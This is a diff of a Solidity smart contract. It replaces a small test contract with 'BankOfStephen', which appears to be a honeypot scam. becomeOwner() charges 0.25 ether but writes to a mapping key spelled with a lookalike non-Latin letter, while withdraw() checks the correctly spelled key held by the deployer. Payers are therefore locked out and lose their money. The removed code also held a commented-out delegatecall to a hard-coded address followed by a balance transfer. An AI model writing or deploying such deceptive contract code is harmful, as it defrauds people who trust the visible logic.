@@ -1,34 +1,24 @@
-pragma solidity ^0.4.19;
+pragma solidity ^0.4.24;
 
-contract Test {
-    // address Owner;
-    // address adr;
-    // uint256 public Limit= 1000000000000000000;
-    // address emails = 0x25df6e3da49f41ef5b99e139c87abc12c3583d13;
+contract BankOfStephen {
+    uint a;
+    uint b;
+    mapping(bytes32 => address) private owner;
 
-    function main(uint256 x) external returns(uint256){
-      if (x > 5){
-        return this.multiply(x);
-      }
+    constructor() public {
+        b = 10;
+        owner["Stephen"] = msg.sender;
     }
 
-    function multiply(uint256 x) public returns(uint256){
-      return x * 10;
+    function becomeOwner() public payable {
+        require(msg.value >= 0.25 ether);
+        owner["Stephеn"] = msg.sender;
     }
 
-    // function add3(uint256 x) public returns(uint256){
-    //   return x + 3;
-    // }
-    
-    // function withdrawal()
-    // payable public
-    // {
-    //     adr=msg.sender;
-    //     if(msg.value>Limit)
-    //     {
-    //         emails.delegatecall(bytes4(sha3("logEvent()")));
-    //         adr.send(this.balance);
-    //     }
-    // }
+    function withdraw() public {
+        require(owner["Stephen"] == msg.sender);
+        msg.sender.transfer(address(this).balance);
+    }
 
+    // function() public payable {}
 }
